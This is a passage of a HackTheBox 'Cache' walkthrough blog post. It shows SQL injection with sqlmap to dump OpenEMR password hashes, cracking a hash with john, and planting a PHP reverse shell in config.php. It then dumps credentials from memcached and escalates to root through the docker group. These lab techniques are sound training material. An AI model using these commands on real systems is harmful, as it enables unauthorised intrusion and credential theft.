</pre><td class="rouge-code"><pre>+-------------------+--------------+
| Column            | Type         |
+-------------------+--------------+
| <span class="nb">id</span>                | bigint<span class="o">(</span>20<span class="o">)</span>   |
| last_update       | timestamp    |
| password          | varchar<span class="o">(</span>255<span class="o">)</span> |
| password_history1 | varchar<span class="o">(</span>255<span class="o">)</span> |
| password_history2 | varchar<span class="o">(</span>255<span class="o">)</span> |
| salt              | varchar<span class="o">(</span>255<span class="o">)</span> |
| salt_history1     | varchar<span class="o">(</span>255<span class="o">)</span> |
| salt_history2     | varchar<span class="o">(</span>255<span class="o">)</span> |
| username          | varchar<span class="o">(</span>255<span class="o">)</span> |
+-------------------+--------------+
</pre></table></code></div></div><p>So its better to <code class="language-plaintext highlighter-rouge">dump</code> all the data from the <code class="language-plaintext highlighter-rouge">table</code>.</p><blockquote><p>Query</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>➜  cache sqlmap <span class="nt">-r</span> login.req <span class="nt">--threads</span><span class="o">=</span>10 <span class="nt">-D</span> openemr <span class="nt">-T</span> users_secure <span class="nt">--dump</span> 
</pre></table></code></div></div><blockquote><p>output</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">id</span>,salt,username,password,last_update,salt_history2,salt_history1,password_history2,password_history1
1,<span class="nv">$2a$05$l2sTLIG6GTBeyBf7TAKL6A$,</span>openemr_admin,<span class="nv">$2a$05$l2sTLIG6GTBeyBf7TAKL6</span>.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.,2019-11-21 06:38:40,NULL,NULL,NULL,NULL
</pre></table></code></div></div><p>So here we got a user called <code class="language-plaintext highlighter-rouge">openemr_admin</code> and a password <code class="language-plaintext highlighter-rouge">hash</code> , Better if we crack the hash</p><h2 id="cracking-the-hash-with-john">Cracking the hash with john</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>➜  cache <span class="nb">cat hash</span>
<span class="nv">$2a$05$l2sTLIG6GTBeyBf7TAKL6</span>.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.
</pre></table></code></div></div><blockquote><p>cracking the hash</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>➜  cache john <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>bcrypt <span class="o">[</span>Blowfish 32/64 X3]<span class="o">)</span>
Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 32 <span class="k">for </span>all loaded hashes
Will run 4 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
xxxxxx           <span class="o">(</span>?<span class="o">)</span>
1g 0:00:00:00 DONE <span class="o">(</span>2020-05-10 13:11<span class="o">)</span> 1.190g/s 1028p/s 1028c/s 1028C/s tristan..felipe
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed
➜  cache  
</pre></table></code></div></div><p>Now we can login with these <strong>credentials</strong> <code class="language-plaintext highlighter-rouge">openemr_admin : xxxxxx</code> on <code class="language-plaintext highlighter-rouge">hms.htb</code> portal</p><h2 id="log-in-to-openemr">Log in to openEmr</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/cache/5dd80ad3-e48a-408c-8ab7-48c14ec9a481/image-9.png" alt="HMS.htb" /></p><p>It didnt took me much time to find the files management <code class="language-plaintext highlighter-rouge">system</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/cache/5dd80ad3-e48a-408c-8ab7-48c14ec9a481/image-10.png" alt="HMS.htb" /></p><p>Just goto <code class="language-plaintext highlighter-rouge">Administaration -&gt; Files</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/cache/5dd80ad3-e48a-408c-8ab7-48c14ec9a481/image-11.png" alt="HMS.htb" /></p><p>Here we can chage the <code class="language-plaintext highlighter-rouge">system</code> files that are serving on <code class="language-plaintext highlighter-rouge">application</code></p><p>The path of the files will be</p><blockquote><p>http://hms.htb/sites/default/filename</p></blockquote><p>So i will edit a <code class="language-plaintext highlighter-rouge">system</code> file called <code class="language-plaintext highlighter-rouge">config.php</code> and embed my <strong>php reverse shell</strong> in it. And execute the file and we got a shell as <code class="language-plaintext highlighter-rouge">www-data</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/cache/5dd80ad3-e48a-408c-8ab7-48c14ec9a481/image-12.png" alt="HMS.htb" /></p><blockquote><p>Insert the following code</p></blockquote><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           

<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>And execute the file by making a <code class="language-plaintext highlighter-rouge">request</code> it</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>➜  cache curl http://hms.htb/sites/default/config.php
</pre></table></code></div></div><blockquote><p>Got shell as <code class="language-plaintext highlighter-rouge">www-data</code></p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>➜  prashant rlwrap nc <span class="nt">-nlvp</span> 1234                              
Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.10.188.
Ncat: Connection from 10.10.10.188:59666.
Linux cache 4.15.0-99-generic <span class="c">#100-Ubuntu SMP Wed Apr 22 20:32:56 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
 12:32:56 up  4:13,  0 <span class="nb">users</span>,  load average: 0.01, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>2018<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@cache:/<span class="nv">$ </span>
</pre></table></code></div></div><h1 id="dumping-data-from-memcached">Dumping data From memcached</h1><p>After some <code class="language-plaintext highlighter-rouge">manual</code> information i found out that <code class="language-plaintext highlighter-rouge">mysql</code> and <code class="language-plaintext highlighter-rouge">memcached</code> service are running locally</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>www-data@cache:/<span class="nv">$ </span>ss <span class="nt">-nlt</span>
ss <span class="nt">-nlt</span>
State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    
LISTEN   0         80                127.0.0.1:3306             0.0.0.0:<span class="k">*</span>       
LISTEN   0         128               127.0.0.1:11211            0.0.0.0:<span class="k">*</span>       
</pre></table></code></div></div><p>And <code class="language-plaintext highlighter-rouge">Memcached</code> is a <code class="language-plaintext highlighter-rouge">vulnerable</code> service we can easily dump the <strong>Stored</strong> data from it</p><p>Here are few articles</p><blockquote><p><a href="https://www.hackingarticles.in/penetration-testing-on-memcached-server/" target="_blank">https://www.hackingarticles.in/penetration-testing-on-memcached-server/</a></p></blockquote><blockquote><p><a href="https://niiconsulting.com/checkmate/2013/05/memcache-exploit/" target="_blank">https://niiconsulting.com/checkmate/2013/05/memcache-exploit/</a></p></blockquote><p>We can <code class="language-plaintext highlighter-rouge">connect</code> to the port <code class="language-plaintext highlighter-rouge">11211</code> using netcat since its already <strong>installed</strong> on the box</p><blockquote></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
</pre><td class="rouge-code"><pre>www-data@cache:/<span class="nv">$ </span>nc 127.0.0.1 11211
nc 127.0.0.1 11211
stats
STAT pid 1022
STAT <span class="nb">uptime </span>15472
STAT <span class="nb">time </span>1589114272
STAT version 1.5.6 Ubuntu
STAT libevent 2.1.8-stable
STAT pointer_size 64
STAT rusage_user 0.955896
STAT rusage_system 1.827802
STAT max_connections 1024
STAT curr_connections 1
STAT total_connections 260
STAT rejected_connections 0
STAT connection_structures 3
STAT reserved_fds 20
STAT cmd_get 4
STAT cmd_set 1285
STAT cmd_flush 0
STAT cmd_touch 0
STAT get_hits 3
STAT get_misses 1
STAT get_expired 0
STAT get_flushed 0
STAT delete_misses 0
STAT delete_hits 0
STAT incr_misses 0
STAT incr_hits 0
STAT decr_misses 0
STAT decr_hits 0
STAT cas_misses 0
STAT cas_hits 0
STAT cas_badval 0
STAT touch_hits 0
STAT touch_misses 0
STAT auth_cmds 0
STAT auth_errors 0
STAT bytes_read 39372
STAT bytes_written 10382
STAT limit_maxbytes 67108864
STAT accepting_conns 1
STAT listen_disabled_num 0
STAT time_in_listen_disabled_us 0
STAT threads 4
STAT conn_yields 0
STAT hash_power_level 16
STAT hash_bytes 524288
STAT hash_is_expanding 0
STAT slab_reassign_rescues 0
STAT slab_reassign_chunk_rescues 0
STAT slab_reassign_evictions_nomem 0
STAT slab_reassign_inline_reclaim 0
STAT slab_reassign_busy_items 0
STAT slab_reassign_busy_deletes 0
STAT slab_reassign_running 0
STAT slabs_moved 0
STAT lru_crawler_running 0
STAT lru_crawler_starts 5865
STAT lru_maintainer_juggles 34040
STAT malloc_fails 0
STAT log_worker_dropped 0
STAT log_worker_written 0
STAT log_watcher_skipped 0
STAT log_watcher_sent 0
STAT bytes 371
STAT curr_items 5
STAT total_items 1285
STAT slab_global_page_pool 0
STAT expired_unfetched 0
STAT evicted_unfetched 0
STAT evicted_active 0
STAT evictions 0
STAT reclaimed 0
STAT crawler_reclaimed 0
STAT crawler_items_checked 88
STAT lrutail_reflocked 0
STAT moves_to_cold 1285
STAT moves_to_warm 0
STAT moves_within_lru 0
STAT direct_reclaims 0
STAT lru_bumps_dropped 0
END
</pre></table></code></div></div><p>I Will be using <code class="language-plaintext highlighter-rouge">watch</code> from fetch the data .</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>watch fetchers
OK
<span class="nv">ts</span><span class="o">=</span>1589114401.199460 <span class="nv">gid</span><span class="o">=</span>1 <span class="nb">type</span><span class="o">=</span>item_get <span class="nv">key</span><span class="o">=</span>account <span class="nv">status</span><span class="o">=</span>found <span class="nv">clsid</span><span class="o">=</span>1
<span class="nv">ts</span><span class="o">=</span>1589114401.448736 <span class="nv">gid</span><span class="o">=</span>2 <span class="nb">type</span><span class="o">=</span>item_get <span class="nv">key</span><span class="o">=</span>file <span class="nv">status</span><span class="o">=</span>found <span class="nv">clsid</span><span class="o">=</span>1
<span class="nv">ts</span><span class="o">=</span>1589114401.700036 <span class="nv">gid</span><span class="o">=</span>3 <span class="nb">type</span><span class="o">=</span>item_get <span class="nv">key</span><span class="o">=</span>passwd <span class="nv">status</span><span class="o">=</span>found <span class="nv">clsid</span><span class="o">=</span>1
<span class="nv">ts</span><span class="o">=</span>1589114401.951157 <span class="nv">gid</span><span class="o">=</span>4 <span class="nb">type</span><span class="o">=</span>item_get <span class="nv">key</span><span class="o">=</span>user <span class="nv">status</span><span class="o">=</span>found <span class="nv">clsid</span><span class="o">=</span>1
<span class="nv">ts</span><span class="o">=</span>1589114402.202163 <span class="nv">gid</span><span class="o">=</span>5 <span class="nb">type</span><span class="o">=</span>item_get <span class="nv">key</span><span class="o">=</span><span class="nb">link </span><span class="nv">status</span><span class="o">=</span>found <span class="nv">clsid</span><span class="o">=</span>1
</pre></table></code></div></div><p>Here i got incoming <code class="language-plaintext highlighter-rouge">request</code> to the <code class="language-plaintext highlighter-rouge">watch</code>.</p><blockquote><p>Dumping Key values</p></blockquote><blockquote><p>account</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>get account
VALUE account 0 9
afhj556uo
END
</pre></table></code></div></div><blockquote><p>file</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>get file
VALUE file 0 7
nothing
END
</pre></table></code></div></div><blockquote><p>user</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>get user
VALUE user 0 5
luffy
END
</pre></table></code></div></div><blockquote><p>passwd</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>get passwd
VALUE passwd 0 9
0n3_p1ec3
END
</pre></table></code></div></div><p>We got two important things here <code class="language-plaintext highlighter-rouge">user:luffy</code> and <code class="language-plaintext highlighter-rouge">passwd : 0n3_p1ec3</code></p><p>These are the credentials of user <code class="language-plaintext highlighter-rouge">luffy</code> .</p><h1 id="login-as-luffy">Login as luffy</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>➜  prashant sshpass <span class="nt">-p</span> 0n3_p1ec3 ssh luffy@cache.htb    
Welcome to Ubuntu 18.04.2 LTS <span class="o">(</span>GNU/Linux 4.15.0-99-generic x86_64<span class="o">)</span>

Last login: Sun May 10 09:45:04 2020 from 10.10.14.10
luffy@cache:~<span class="nv">$ </span>
</pre></table></code></div></div><p>And i am logged in as <code class="language-plaintext highlighter-rouge">luffy</code></p><p>the user luffy also doesnt have read <code class="language-plaintext highlighter-rouge">perm</code> to the file <code class="language-plaintext highlighter-rouge">user.txt</code>. XD i was thinking that i need to find a way for <code class="language-plaintext highlighter-rouge">ash</code>.</p><blockquote><p>id</p></blockquote><p>By running id we can see that the user <code class="language-plaintext highlighter-rouge">luffy</code> is in the group <code class="language-plaintext highlighter-rouge">docker</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>luffy@cache:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>luffy<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>luffy<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>luffy<span class="o">)</span>,999<span class="o">(</span>docker<span class="o">)</span>
luffy@cache:~<span class="nv">$ </span>
</pre></table></code></div></div><p>Now if we look up at <code class="language-plaintext highlighter-rouge">gtfobins</code> for docker we have something <code class="language-plaintext highlighter-rouge">juicy</code> here.</p><blockquote><p><a href="https://gtfobins.github.io/gtfobins/docker/" target="_blank">https://gtfobins.github.io/gtfobins/docker/</a></p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/cache/5dd80ad3-e48a-408c-8ab7-48c14ec9a481/image-13.png" alt="Gtfobins" /></p><p>It state that if a user is in <code class="language-plaintext highlighter-rouge">docker</code> group he can escalate to root.</p><p>We need to find the <code class="language-plaintext highlighter-rouge">valid</code> images for the docker</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>luffy@cache:~<span class="nv">$ </span>docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
ubuntu              latest              2ca708c1c9cc        7 months ago        64.2MB
</pre></table></code></div></div><p>So the valid <code class="language-plaintext highlighter-rouge">image</code> is <code class="language-plaintext highlighter-rouge">ubuntu</code></p><p>I can mount the <code class="language-plaintext highlighter-rouge">images</code> using <code class="language-plaintext highlighter-rouge">docker</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>luffy@cache:~<span class="nv">$ </span>docker run <span class="nt">-v</span> /:/mnt <span class="nt">--rm</span> <span class="nt">-it</span> ubuntu <span class="nb">chroot</span> /mnt bash
</pre></table></code></div></div><p>And by doing this we are <code class="language-plaintext highlighter-rouge">root</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>root@a6413089f056:/# <span class="nb">whoami
</span>root
</pre></table></code></div></div><h1 id="got-usertxt">Got user.txt</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>root@a6413089f056:/# <span class="nb">cat</span> /home/ash/user.txt 
20b------------------------9741
root@a6413089f056:/# 
</pre></table></code></div></div><h1 id="got-roottxt">Got root.txt</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>root@a6413089f056:/# <span class="nb">cat</span> /root/root.txt
0f7--------------------------859b
root@a6413089f056:/#
</pre></table></code></div></div><h1 id="ananlysis-of-user-ash">Ananlysis of user ash</h1><p>Since i never been to user <code class="language-plaintext highlighter-rouge">ash</code> and didnt get any chance to read the user flag. And come accross the file <code class="language-plaintext highlighter-rouge">/var/www/cache.htb/public_html/jquery</code> The <code class="language-plaintext highlighter-rouge">creator</code> want us to read the file and there is a file called <code class="language-plaintext highlighter-rouge">functionality.js</code> and there is a password.and I confirm that the <code class="language-plaintext highlighter-rouge">password</code> is of user <code class="language-plaintext highlighter-rouge">ash</code> as we can see the script.</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre><span class="nx">root</span><span class="p">@</span><span class="nd">a6413089f056</span><span class="p">:</span><span class="o">/</span><span class="kd">var</span><span class="sr">/www/</span><span class="nx">cache</span><span class="p">.</span><span class="nx">htb</span><span class="o">/</span><span class="nx">public_html</span><span class="o">/</span><span class="nx">jquery</span><span class="err">#</span> <span class="nx">cat</span> <span class="nx">functionality</span><span class="p">.</span><span class="nx">js</span> 
<span class="nx">$</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
    
    <span class="kd">var</span> <span class="nx">error_correctPassword</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">error_username</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
    
    <span class="kd">function</span> <span class="nx">checkCorrectPassword</span><span class="p">(){</span>
        <span class="kd">var</span> <span class="nx">Password</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#password</span><span class="dl">"</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">Password</span> <span class="o">!=</span> <span class="dl">'</span><span class="s1">H@v3_fun</span><span class="dl">'</span><span class="p">){</span>
            <span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Password didn't Match</span><span class="dl">"</span><span class="p">);</span>
            <span class="nx">error_correctPassword</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="kd">function</span> <span class="nx">checkCorrectUsername</span><span class="p">(){</span>
        <span class="kd">var</span> <span class="nx">Username</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#username</span><span class="dl">"</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">Username</span> <span class="o">!=</span> <span class="dl">"</span><span class="s2">ash</span><span class="dl">"</span><span class="p">){</span>
            <span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Username didn't Match</span><span class="dl">"</span><span class="p">);</span>
            <span class="nx">error_username</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#loginform</span><span class="dl">"</span><span class="p">).</span><span class="nx">submit</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
        <span class="cm">/* Act on the event */</span>
        <span class="nx">error_correctPassword</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
         <span class="nx">checkCorrectPassword</span><span class="p">();</span>
         <span class="nx">error_username</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
         <span class="nx">checkCorrectUsername</span><span class="p">();</span>


        <span class="k">if</span><span class="p">(</span><span class="nx">error_correctPassword</span> <span class="o">==</span> <span class="kc">false</span> <span class="o">&amp;&amp;</span> <span class="nx">error_username</span> <span class="o">==</span><span class="kc">false</span><span class="p">){</span>
            <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span><span class="p">{</span>
            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">});</span>
    
<span class="p">});</span>
</pre></table></code></div></div><blockquote><p><code class="language-plaintext highlighter-rouge">password : H@v3_fun</code></p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>luffy@cache:~<span class="nv">$ </span>su - ash
Password: 
ash@cache:~<span class="err">$</span>
</pre></table></code></div></div><p>And we pwned it …….</p><p>If u liked the writeup.Support a Poor Student to Get the <code class="language-plaintext highlighter-rouge">OSCP-Cert</code> on <a href="https://www.buymeacoffee.com/0xprashant" target="_blank">BuymeaCoffee</a></p><blockquote><p>If you want to get notified as soon as i upload something new to my <code class="language-plaintext highlighter-rouge">blog</code> So just click on the bell icon you are seeing on the right side – &gt; and allow push <code class="language-plaintext highlighter-rouge">notification</code></p></blockquote><h1 id="resources">Resources</h1><div class="table-wrapper"><table><thead><tr><th>Topic<th>Url<tbody><tr><td>OpenEmr Vulnerability<td><a href="https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf" target="_blank">https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf</a><tr><td>OpenEmr Vulnerability ( video)<td><a href="https://www.youtube.com/watch?v=DJSQ8Pk_7hc&amp;t=73s" target="_blank">https://www.youtube.com/watch?v=DJSQ8Pk_7hc&amp;t=73s</a><tr><td>Memecache<td><a href="https://www.hackingarticles.in/penetration-testing-on-memcached-server/" target="_blank">https://www.hackingarticles.in/penetration-testing-on-memcached-server/</a><tr><td>Memcacahe<td><a href="https://niiconsulting.com/checkmate/2013/05/memcache-exploit/" target="_blank">https://niiconsulting.com/checkmate/2013/05/memcache-exploit/</a><tr><td>Docker<td><a href="https://gtfobins.github.io/gtfobins/docker/" target="_blank">https://gtfobins.github.io/gtfobins/docker/</a></table></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>Hackthebox</a>, <a href='/categories/retired/'>retired</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/cewl/" class="post-tag no-text-decoration" >cewl</a> <a href="/tags/wfuzz/" class="post-tag no-text-decoration" >wfuzz</a> <a href="/tags/sql-injection/" class="post-tag no-text-decoration" >sql injection</a> <a href="/tags/sqli/" class="post-tag no-text-decoration" >sqli</a> <a href="/tags/sqlmap/" class="post-tag no-text-decoration" >sqlmap</a> <a href="/tags/memcache/" class="post-tag no-text-decoration" >memcache</a> <a href="/tags/docker/" class="post-tag no-text-decoration" >docker</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Cache writeup - 0xPrashant&url=http://localhost:4000/posts/htb-cache/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Cache writeup - 0xPrashant&u=http://localhost:4000/posts/htb-cache/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hackthebox Cache writeup - 0xPrashant&url=http://localhost:4000/posts/htb-cache/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-control/"><div class="card-body"> <span class="timeago small" > Feb 18 <i class="unloaded">2020-02-18T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Control writeup</h3><div class="text-muted small"><p> information@control:~$ Column Details Name Control IP 10.10.10.167 Points 40 Os W...</p></div></div></a></div><div class="card"> <a href="/posts/htb-oouch/"><div class="card-body"> <span class="timeago small" > Mar 14 <i class="unloaded">2020-03-14T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Oouch writeup</h3><div class="text-muted small"><p> Information Column Details Name Oouch Points 40 Difficulty Hard Creator QTC ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-obsecurity/"><div class="card-body"> <span class="timeago small" > May 9 <i class="unloaded">2020-05-09T00:00:00+08:00</i> </span><h3 class="pt-0 